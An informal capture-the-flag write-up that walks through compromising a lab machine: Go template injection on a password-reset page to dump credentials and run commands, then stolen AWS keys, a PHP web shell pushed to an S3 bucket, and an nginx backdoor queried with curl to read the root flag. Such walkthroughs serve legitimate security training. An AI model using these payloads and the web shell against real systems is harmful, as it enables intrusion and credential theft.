Started with a nmap scan
```
22 OpenSSH 8.2p1
80 nginx
4566 nginx
8080 nginx
```
Checking out the webservers port `80` is a normal site `4566` is 403 forebedden and `8080` is a login page running a gobuster on the `80` host only found a `/css` running the scan on `4566` found nothing running scan on the `8080` now
```
/forgot/
```
This website on port `8080` is coded in golang so it might be vulnerable to ssti and the password reset reflects what we put in it back to us if we intercept the request and use this payload 
```
{{len `test`}}
```
this will return 4 if it works and it does we can get this to send us the login data with this payload 
```
{{ . }}
```
and we got the creds for a user `ippsec@hacking.esports:ippsSecretPassword` we log in and it just gives us the code looking at the code there is a `DebugCmd` that calls system commands we can use this to get access to the machine if we do `{{ .DebugCmd "id" }}` we get back `root` so now we have RCE doing some enumeration on the docker its using `aws` and if we do `aws s3 ls` we get the website and we can write to this site `echo '<?php echo shell_exec($_REQUEST["cmd"]); ?>' /tmp/shell` and then we can upload it `aws s3 cp /tmp/shell s3://website/shell.php` and now we can hit this from the main site on port `80` we can also get the creds and do this from are own machine if we go to `/root/.aws/credientals` so now getting a reverse shell out side of the docker looking around the host we found a `50-backdoor.conf` in the nginx modules and we can google this and get a github repo `NginxExecute` and this backdoor is listening on port `8000` and to interact with it the parameter is `ippsec.run[id]` will return the id we can get this from running strings on the binary and now we can run commands as root `curl 127.0.0.1:8000/?ippsec.run[id]` returns root and now we can get the flag to get the root flag `curl 127.0.0.1:8000/?ippsec.run[cat%20%2froot%2froot.txt]` 
 